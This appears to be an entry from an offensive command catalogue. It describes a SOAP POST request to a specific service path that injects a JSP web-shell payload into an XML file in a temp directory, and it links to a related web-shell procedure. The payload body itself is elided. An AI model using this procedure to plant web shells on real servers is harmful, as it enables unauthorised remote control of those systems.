---
data: |-
  POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
  <?xml version="1.0" encoding="utf-8"?>
  <soapenv:Envelope ...>
  <soapenv:Body>
  <api:main ...>
  <api:in0>
  <item ...> ... </item>
  </api:in0>
  </api:main>
  </soapenv:Body>
  </soapenv:Envelope>
tags:
  - soap
  - payload-injection
type: command
executor: bash
platforms:
  - Linux
  - Web
id: e26d8876-c1f4-4d3c-8f30-9aef1eb881fb
created_at: '2025-12-13T09:00:33.598Z'
updated_at: '2025-12-13T09:00:33.598Z'
verified: false
validated: true
submitted: true
---
# POST SOAP Inject Payload

## Command

```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:main ...>
<api:in0>
<item ...> ... </item>
</api:in0>
</api:main>
</soapenv:Body>
</soapenv:Envelope>
```

## Description

Adds JSP shell payload to the XML in temp directory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `in0` | Array of items including paths and CDATA with JSP code | Yes |

## Examples

### Basic Usage

```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:main ...>
<api:in0>
<item ...> ... </item>
</api:in0>
</api:main>
</soapenv:Body>
</soapenv:Envelope>
```

## Expected Output

Payload injected successfully.

## Related

- [[procedures/Inject-JSP-Webshell-Payload]]
